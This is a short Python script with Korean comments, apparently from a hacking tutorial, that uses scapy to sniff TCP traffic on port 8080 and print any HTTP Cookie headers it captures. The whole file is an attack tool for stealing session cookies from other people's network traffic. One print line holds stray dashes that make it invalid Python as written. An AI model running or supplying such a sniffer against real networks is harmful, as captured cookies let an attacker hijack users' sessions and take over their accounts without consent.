#쿠키 정보 가로채기

from scapy.all import *
#re : 파이썬에서 정규식 지원 모듈
import re

def cookieSniffer(packet):
	tcp = packet.getlayer('TCP')
	#'Cookie: 문자열‘과 동일한 패턴을 찾기 위해
	cookie = re.search(r'Cookie(.+)', str(tcp.payload))
	
	if cookie:
		print(---'COOKIE SNIFFED\n[%s]' %cookie.group())
	
	
def main():
	print('+++START SNIFFING COOKIE')
	sniff(filter='tcp port 8080', store=0, prn=cookieSniffer)
	

if __name__ == '__main__':
	main()
